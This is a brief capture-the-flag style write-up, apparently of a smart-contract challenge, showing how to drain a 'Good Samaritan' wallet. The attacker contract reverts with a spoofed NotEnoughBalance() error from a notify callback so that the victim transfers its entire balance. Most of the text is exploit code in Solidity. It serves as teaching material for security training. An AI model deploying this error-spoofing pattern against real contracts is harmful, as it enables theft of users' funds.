> Would you be able to drain all the balance from his Wallet?

## Picky bugger

We could beg for 10 coins:

```solidity
function requestDonation() external returns(bool enoughBalance){
    // donate 10 coins to requester
    try wallet.donate10(msg.sender) {
        return true;
    } catch (bytes memory err) {
        if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
            // send the coins left
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```

Or just bug for the whole balance:

```solidity
contract Bug {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        revert NotEnoughBalance();
    }

    function monez(address target) public {
        Cretin(target).requestDonation();
    }
}
```

The donation reverts because the coin calls back to the requesting contract:

```solidity
if(dest_.isContract()) {
    // notify contract 
    INotifyable(dest_).notify(amount_);
}
```

Which gives an opportunity to complain and empty the samaritan pockets!

However, the contract should refuse 10 coins but not the whole balance:

```solidity
function notify(uint256 amount) external {
    if (amount <= 100) {
        revert NotEnoughBalance();
    }
}
```
